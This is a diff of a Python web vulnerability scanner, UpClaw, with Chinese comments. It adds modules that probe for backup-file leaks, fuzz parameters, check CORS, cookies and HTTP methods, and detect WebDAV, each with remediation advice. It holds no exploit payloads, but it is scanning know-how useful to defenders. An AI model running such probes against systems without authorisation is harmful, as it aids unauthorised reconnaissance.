+    def probe(t: str) -> dict[str, Any] | None:
+        limiter.wait()
+        r = _get(f"{base_url}/{t}", cfg, limiter)
+        if not r.ok:
+            return None
+        if r.status == base_status:
+            return None
+        if r.status == 200:
+            return {"t": t, "status": r.status, "len": len(r.body or "")}
+        return None
+
+    found: list[dict[str, Any]] = []
+    with ThreadPoolExecutor(max_workers=threads) as ex:
+        for res in ex.map(probe, targets):
+            if res:
+                found.append(res)
+    if not found:
+        return
+    store.add(
+        title=f"发现 {len(found)} 个备份/泄漏文件",
+        severity="HIGH",
+        status="VERIFIED",
+        category="backup",
+        target=url,
+        location=base_url,
+        description="以下备份或源码文件可被公开访问，可能包含源码、配置或敏感数据：",
+        evidence="\n".join(f"  {f['status']}  /{f['t']} ({f['len']}B)" for f in found[:30]),
+        request=f"GET {base_url}/<file><backup-suffix>",
+        impact="备份文件常包含完整源码、数据库凭据、API 密钥，可导致严重信息泄露。",
+        remediation="禁止将备份文件放置在 Web 根目录；配置服务器拒绝访问 .bak/.sql 等后缀；"
+                    "定期清理服务器上的备份文件。",
+        references=["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage"],
+        cvss=7.5,
+    )
+
+
+FUZZ_PARAMS = [
+    "debug", "test", "admin", "user", "id", "page", "lang", "redirect", "return", "next",
+    "url", "file", "path", "dir", "folder", "view", "action", "mod", "do", "op", "type",
+    "format", "callback", "email", "name", "q", "search", "s", "cmd", "exec", "command",
+    "download", "token", "key", "api_key", "apikey", "secret", "password", "pass", "config",
+    "source", "src", "include", "require", "template", "theme", "cache", "cat", "f",
+]
+
+
+def _run_fuzz(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
+    """参数模糊测试：注入常见参数名，检测响应异常（错误/调试信息泄露）。"""
+    base_url = url.split("?")[0]
+    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.04)
+    threads = max(1, min(int(cfg.get("threads", 16)), 32))
+    base = _get(url, cfg, limiter)
+    base_len = len(base.body or "") if base.ok else 0
+    base_status = base.status if base.ok else 0
+    # 注入值：唯一标记，检测回显（反射/日志注入）
+    marker = "fz" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))
+    interesting = ["debug", "test", "admin", "config", "source", "src", "cmd", "exec", "template", "callback", "download", "trace", "verbose"]
+
+    def probe(name: str) -> dict[str, Any] | None:
+        limiter.wait()
+        test_url = f"{base_url}?{urllib.parse.urlencode({name: marker})}"
+        r = _get(test_url, cfg, limiter)
+        if not r.ok:
+            return None
+        if r.status in (500, 501) or len(r.body or "") > base_len + 2000:
+            return {"name": name, "status": r.status, "delta": len(r.body or "") - base_len}
+        if marker in (r.body or ""):
+            return {"name": name, "status": r.status, "reflected": True}
+        return None
+
+    hits: list[dict[str, Any]] = []
+    with ThreadPoolExecutor(max_workers=threads) as ex:
+        for res in ex.map(probe, FUZZ_PARAMS):
+            if res:
+                hits.append(res)
+    if not hits:
+        return
+    reflected = [h for h in hits if h.get("reflected")]
+    error_hits = [h for h in hits if not h.get("reflected")]
+    lines = "\n".join(
+        f"  {h['name']}: status={h['status']}" + (f" delta={h['delta']}B" if "delta" in h else " [参数值回显]")
+        for h in hits[:30]
+    )
+    store.add(
+        title=f"参数模糊：发现 {len(hits)} 个异常参数行为",
+        severity="LOW",
+        status="UNVERIFIED" if not reflected else "VERIFIED",
+        category="fuzz",
+        target=url,
+        location=base_url,
+        description="注入常见参数名后观察到异常响应（错误/调试信息/输入回显）：",
+        evidence=lines,
+        request=f"GET {base_url}?<param>=<marker>",
+        impact="可能暴露调试信息、源码路径或可反射参数（放大其他漏洞）；需人工复核。",
+        remediation="生产环境关闭错误回显与调试模式；对所有参数做输入校验与输出编码。",
+        references=["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting"],
+        cvss=2.6 if not reflected else 3.7,
+    )
+
+
+def _request_raw(
+    url: str,
+    cfg: dict[str, Any],
+    method: str = "GET",
+    headers: dict[str, str] | None = None,
+) -> tuple[int, list[tuple[str, str]], str, str]:
+    """原始 HTTP 请求：保留全部响应头（含重复 Set-Cookie）。
+
+    返回 (status, headers 列表, body, error)。与 http_request 不同，
+    不做重定向跟随，供 cookie / cors / methods / webdav 等需逐响应头分析的模块使用。
+    """
+    hdrs = {"User-Agent": str(cfg.get("user_agent", "UpClaw/0.1.0")), "Accept": "*/*"}
+    if headers:
+        hdrs.update(headers)
+    try:
+        p = urllib.parse.urlparse(url)
+        scheme = p.scheme or "https"
+        host = p.hostname or ""
+        port = p.port or (443 if scheme == "https" else 80)
+        path = p.path or "/"
+        if p.query:
+            path += "?" + p.query
+        ctx = None
+        if scheme == "https":
+            ctx = ssl.create_default_context()
+            if not bool(cfg.get("verify_tls", False)):
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+        conn = (
+            http.client.HTTPSConnection(host, port, timeout=float(cfg.get("timeout", 6.0)), context=ctx)
+            if scheme == "https"
+            else http.client.HTTPConnection(host, port, timeout=float(cfg.get("timeout", 6.0)))
+        )
+        try:
+            conn.request(method, path, headers=hdrs)
+            resp = conn.getresponse()
+            raw = resp.read()
+            text = raw.decode("utf-8", errors="replace")
+            return resp.status, resp.getheaders(), text, ""
+        finally:
+            conn.close()
+    except socket.timeout:
+        return 0, [], "", f"请求超时 ({cfg.get('timeout', 6.0)}s)"
+    except ssl.SSLError as e:
+        return 0, [], "", f"TLS 错误: {e}"
+    except (http.client.HTTPException, OSError) as e:
+        return 0, [], "", f"连接失败: {e}"
+
+
+def _has_cookie_flag(cookie_raw: str, flag: str) -> bool:
+    """判断某条 Set-Cookie 原始值是否包含指定属性（Secure/HttpOnly/SameSite...）。"""
+    for part in cookie_raw.split(";"):
+        name = part.strip().split("=", 1)[0].strip().lower()
+        if name == flag.lower():
+            return True
+    return False
+
+
+def _run_cors(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
+    """CORS 检测：Origin 反射 + Access-Control-Allow-Credentials 组合判定。"""
+    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.05)
+    limiter.wait()
+    status, _, _, err = _request_raw(url, cfg, "GET")
+    if err or not status:
+        return
+    origin = "https://upclaw-check.example"
+    limiter.wait()
+    s2, hdrs, _, err2 = _request_raw(url, cfg, "GET", headers={"Origin": origin})
+    if err2 or not s2:
+        return
+    low = {k.lower(): v for k, v in hdrs}
+    acao = (low.get("access-control-allow-origin", "") or "").strip()
+    acac = (low.get("access-control-allow-credentials", "") or "").strip()
+    if not acao:
+        return  # 无 CORS 头，无需关注
+    acac_true = acac.lower() == "true"
+    if acao == "*":
+        title_note = "通配符 ACAO" + (" + 允许凭据（错误配置）" if acac_true else "（任意源可读）")
+        severity, cvss, status_ = ("HIGH", 7.5, "VERIFIED") if acac_true else ("LOW", 5.3, "VERIFIED")
+        impact = (
+            "`Access-Control-Allow-Origin: *` 配合 `Access-Control-Allow-Credentials: true` 属错误配置，"
+            "浏览器虽禁止携带凭据的通配符响应，但结合其他配置可被滥用。"
+            if acac_true
+            else "任意源均可跨域读取该接口响应，可能泄露非敏感业务数据。"
+        )
+    elif origin in acao:
+        title_note = "Origin 反射" + (" + 允许凭据" if acac_true else "（无凭据）")
+        severity, cvss, status_ = ("HIGH", 8.1, "VERIFIED") if acac_true else ("MEDIUM", 6.1, "VERIFIED")
+        impact = (
+            "恶意网站可构造任意 Origin 触发反射，配合允许凭据可携带用户 Cookie 跨域读取敏感数据。"
+            if acac_true
+            else "任意源可将 Origin 反射进 ACAO，跨域读取响应（不携带凭据，危害取决于接口敏感度）。"
+        )
+    else:
+        return  # 固定白名单，配置正常
+    store.add(
+        title=f"CORS 配置：{title_note}",
+        severity=severity,
+        status=status_,
+        category="cors",
+        target=url,
+        location=url,
+        description=f"携带 `Origin: {origin}` 的请求响应返回了 "
+                    f"`Access-Control-Allow-Origin: {acao}`" +
+                    ("，且允许携带凭据（`Access-Control-Allow-Credentials: true`）。"
+                     if acac_true else "，未允许携带凭据。"),
+        evidence=f"响应头:\n  Access-Control-Allow-Origin: {acao}\n"
+                 f"  Access-Control-Allow-Credentials: {acac or '(未设置)'}",
+        request=f"GET {url}\nOrigin: {origin}",
+        impact=impact,
+        remediation="仅在可信来源白名单中反射 Origin；生产环境禁止使用 `*` 通配符；"
+                    "敏感接口不得同时使用凭据模式与宽泛反射。",
+        references=["https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny"],
+        cvss=cvss,
+    )
+
+
+def _run_cookie(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
+    """Cookie 安全属性逐项检查：Secure / HttpOnly / SameSite。"""
+    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.05)
+    limiter.wait()
+    status, hdrs, _, err = _request_raw(url, cfg, "GET")
+    if err or not status:
+        return
+    cookies: list[tuple[str, str]] = []  # (原始 Set-Cookie, cookie 名)
+    for k, v in hdrs:
+        if k.lower() == "set-cookie":
+            name = v.split(";", 1)[0].split("=", 1)[0].strip()
+            cookies.append((v, name))
+    if not cookies:
+        return
+    names = {n for _, n in cookies}
+    checks = [
+        ("HttpOnly", "MEDIUM", 5.4,
+         "未标记 HttpOnly，客户端 JavaScript 可通过 document.cookie 读取会话凭据，XSS 时被直接窃取。",
+         "https://owasp.org/www-community/HttpOnly"),
+        ("Secure", "MEDIUM", 5.9,
+         "未标记 Secure，可能经明文 HTTP 传输被中间人窃听。",
+         "https://owasp.org/www-project-secure-headers/"),
+        ("SameSite", "LOW", 4.3,
+         "未设置 SameSite 属性，跨站请求（CSRF）中 Cookie 的携带策略由浏览器决定，风险取决于浏览器默认行为。",
+         "https://owasp.org/www-community/SameSite"),
+    ]
+    for attr, sev, cvss, desc, ref in checks:
+        missing = sorted(n for raw, n in cookies if not _has_cookie_flag(raw, attr))
+        if not missing:
+            continue
+        store.add(
+            title=f"Cookie 缺少 `{attr}` 属性",
+            severity=sev,
+            status="VERIFIED",
+            category="cookie",
+            target=url,
+            location=url,
+            description=f"响应设置 {len(missing)} 个 Cookie 未标记 `{attr}`：{', '.join(missing)}。{desc}",
+            evidence=f"受影响 Cookie: {', '.join(missing)}\n"
+                     f"Set-Cookie 示例: {next(v for v, _ in cookies if not _has_cookie_flag(v, attr))[:120]}",
+            request=f"GET {url}",
+            impact="会话凭据可能被 XSS 窃取 / 明文传输泄露 / 被 CSRF 利用（取决于缺失属性）。",
+            remediation=f"为所有会话 Cookie 添加 `{attr}` 属性；涉及跨站时按需配置 `SameSite=Lax|Strict|None`。",
+            references=[ref],
+            cvss=cvss,
+        )
+
+
+def _run_methods(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
+    """HTTP 方法探测：OPTIONS 列出允许方法，识别 TRACE/PUT/DELETE 等危险方法。"""
+    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.05)
+    limiter.wait()
+    status, hdrs, _, err = _request_raw(url, cfg, "OPTIONS")
+    if err or not status:
+        return
+    low = {k.lower(): v for k, v in hdrs}
+    allow = ((low.get("allow", "") or "") + "," + (low.get("public", "") or "")).upper()
+    if not allow.strip():
+        return
+    methods = {m.strip() for m in allow.split(",") if m.strip()}
+    danger: list[tuple[str, str, float, str]] = []
+    if "TRACE" in methods:
+        danger.append(("TRACE", "MEDIUM", 5.3,
+                       "跨站追踪（XST）风险：可结合 XSS 窃取 HttpOnly Cookie 或绕过防护。"))
+    if "PUT" in methods:
+        danger.append(("PUT", "MEDIUM", 6.5,
+                       "允许上传/覆盖资源，若未鉴权与文件类型校验可被植入恶意文件。"))
+    if "DELETE" in methods:
+        danger.append(("DELETE", "MEDIUM", 5.3,
+                       "允许删除资源，若未鉴权可造成数据破坏。"))
+    if "PATCH" in methods:
+        danger.append(("PATCH", "LOW", 3.7,
+                       "允许部分修改资源，需确认鉴权与输入校验到位。"))
+    if "CONNECT" in methods:
+        danger.append(("CONNECT", "MEDIUM", 5.0,
+                       "可能被用作代理隧道，绕过访问控制。"))
+    if not danger:
+        return
+    lines = "\n".join(f"  {m}: {d}" for m, _, _, d in danger)
+    store.add(
+        title=f"启用了 {len(danger)} 个危险 HTTP 方法",
+        severity="MEDIUM",
+        status="VERIFIED",
+        category="methods",
+        target=url,
+        location=url,
+        description=f"OPTIONS 响应允许以下危险方法（Allow: {', '.join(sorted(methods))}）：",
+        evidence=lines,
+        request=f"OPTIONS {url}",
+        impact="危险方法一旦缺乏鉴权/校验，可被用于文件写入、数据删除、代理滥用等攻击。",
+        remediation="在 Web 服务器/框架层禁用不需要的方法（尤其 TRACE/PUT/DELETE/CONNECT）；"
+                    "确需使用时必须做鉴权与输入校验。",
+        references=["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods"],
+        cvss=5.3,
+    )
+
+
+def _run_webdav(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
+    """WebDAV 检测：OPTIONS 响应中 DAV / MS-Author-Via / Allow 提示 WebDAV 方法启用。"""
+    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.05)
+    limiter.wait()
+    status, hdrs, _, err = _request_raw(url, cfg, "OPTIONS")
+    if err or not status:
+        return
+    low = {k.lower(): v for k, v in hdrs}
+    allow = (low.get("allow", "") or "").upper()
+    dav = (low.get("dav", "") or "").strip()
+    msv = (low.get("ms-author-via", "") or "").strip()
+    methods = {m.strip() for m in allow.split(",") if m.strip()}
+    dav_methods = {"PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK"}
+    enabled = [m for m in dav_methods if m in methods]
+    if dav:
+        enabled.append(f"DAV:{dav}")
+    if msv:
+        enabled.append(f"MS-Author-Via:{msv}")
+    if not enabled:
+        return
+    dangerous = [m for m in enabled if m in ("MOVE", "COPY", "MKCOL") or m.startswith("DAV:")]
+    severity, cvss = ("HIGH", 7.5) if dangerous else ("MEDIUM", 5.3)
+    store.add(
+        title="启用了 WebDAV 扩展",
+        severity=severity,
+        status="VERIFIED",
+        category="webdav",
+        target=url,
+        location=url,
+        description="OPTIONS 响应表明服务器启用了 WebDAV 相关方法/扩展：",
+        evidence="\n".join(f"  {m}" for m in enabled),
+        request=f"OPTIONS {url}",
+        impact=("WebDAV 允许远程创建/移动/覆盖文件（如 PUT/MOVE），未正确鉴权时可被用于"
+                "上传 Webshell 或篡改站点内容。"
+                if dangerous
+                else "WebDAV 方法暴露了目录/资源元数据，可能泄露文件列表等敏感信息。"),
+        remediation="如无必要，在服务器配置中禁用 WebDAV 模块；确需使用时限制方法、目录并强制鉴权。",
+        references=["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Test_HTTP_Methods"],
+        cvss=cvss,
+    )
+
+
+# === UPCLAW-V0.2-MODULES ===
+
+
 # 检测模块注册表（各模块的 run 函数分别以 _run_xxx 定义）
 AVAILABLE = {
+    # 信息收集
+    "dns": _run_dns,
+    "subdomain": _run_subdomain,
+    "waf": _run_waf,
+    "tls": _run_tls,
+    # 漏洞验证
+    "cmdi": _run_cmdi,
+    "ssrf": _run_ssrf,
+    "xxe": _run_xxe,
+    "lfi": _run_lfi,
+    "open-redirect": _run_open_redirect,
+    "crlf": _run_crlf,
+    # 暴力破解
+    "dir": _run_dir,
+    "backup": _run_backup,
+    "fuzz": _run_fuzz,
+    # Web 安全
+    "cors": _run_cors,
+    "cookie": _run_cookie,
+    "methods": _run_methods,
+    "webdav": _run_webdav,
+    # 基础
     "headers": _run_headers,
     "sensitive": _run_sensitive,
     "sqli": _run_sqli,
     "xss": _run_xss,
 }
 
+# 默认启用的全部检测模块（cmd_scan 默认值）
+DEFAULT_CHECKS = ",".join(AVAILABLE)
+
 
 
 """报告生成：Markdown / HTML / JSON，并归档原始证据。
 
-UpClaw 全量开源（MIT License），报告无版本限制、无水印，可直接交付。
+UpClaw 全量开源（Apache-2.0 License），报告无版本限制、无水印，可直接交付。
 """
 
 
@@ -1521,7 +2685,7 @@ def build_meta(target: str, started: float, cfg: dict[str, Any]) -> dict[str, An
         "started_at": datetime.fromtimestamp(started).astimezone().isoformat(timespec="seconds"),
         "finished_at": datetime.now().astimezone().isoformat(timespec="seconds"),
         "duration_sec": round(time.time() - started, 2),
-        "license_tier": "MIT (Open Source)",
+        "license_tier": "Apache-2.0 (Open Source)",
         "commercial": True,
         "config": {
             "timeout": cfg.get("timeout"),
@@ -1618,7 +2782,7 @@ def render_markdown(meta: dict[str, Any], store: FindingStore, recon: dict[str, 
     if not meta.get("commercial", False):
         L.append("---")
         L.append("")
-        L.append("*本报告由 UpClaw 生成，遵循 MIT 开源协议，可自由用于学习与商业交付。*")
+        L.append("*本报告由 UpClaw 生成，遵循 Apache-2.0 开源协议，可自由用于学习与商业交付。*")
         L.append("")
     return "\n".join(L)
 
@@ -1942,7 +3106,7 @@ def cmd_scan(args: argparse.Namespace, cfg: dict[str, Any]) -> int:
 
     # ---- 漏洞检测 ----
     print("[*] 阶段 3/3  安全检测...")
-    checks = [c.strip() for c in (args.checks or "headers,sensitive,sqli,xss").split(",") if c.strip()]
+    checks = [c.strip() for c in (args.checks or DEFAULT_CHECKS).split(",") if c.strip()]
     for name in checks:
         mod = AVAILABLE.get(name)
         if not mod:
@@ -1956,6 +3120,9 @@ def cmd_scan(args: argparse.Namespace, cfg: dict[str, Any]) -> int:
             if "?" not in url:
                 print(f"    [i] 跳过 {name}：URL 无查询参数")
                 continue
+            mod(store, url, cfg)
+        else:
+            # 其余模块统一签名 (store, url, cfg)
             mod(store, url, cfg)
         if args.verbose:
             print(f"    · {name} 完成")
@@ -2033,7 +3200,7 @@ def cmd_doctor(args: argparse.Namespace, cfg: dict[str, Any]) -> int:
     print(f"  Python      : {sys.version.split()[0]}")
     print(f"  UpClaw      : v{__version__}")
     print(f"  配置文件    : {CONFIG_PATH} {'[存在]' if __import__('os').path.isfile(CONFIG_PATH) else '[未创建，使用默认值]'}")
-    print(f"  开源许可    : MIT（全量开源，免费使用）")
+    print(f"  开源许可    : Apache-2.0（全量开源，免费使用）")
 
     # 网络连通性
     test = args.target or "https://example.com"
@@ -2085,7 +3252,7 @@ def build_parser() -> argparse.ArgumentParser:
     s = sub.add_parser("scan", help="完整扫描（信息收集 + 安全检测）")
     s.add_argument("target", help="目标，如 example.com 或 https://x.com/p?id=1")
     add_common(s)
-    s.add_argument("--checks", help="启用模块，逗号分隔（headers,sensitive,sqli,xss）")
+    s.add_argument("--checks", help=f"启用模块，逗号分隔，默认全部（dns,subdomain,waf,tls,cmdi,ssrf,xxe,lfi,open-redirect,crlf,dir,backup,fuzz,cors,cookie,methods,webdav,headers,sensitive,sqli,xss）")
     s.add_argument("--ports", help="端口列表，如 80,443 或 1-1000")
     s.add_argument("--skip-ports", action="store_true", help="跳过端口扫描")
     s.add_argument("--port-timeout", type=float, default=1.5, help="端口连接超时")
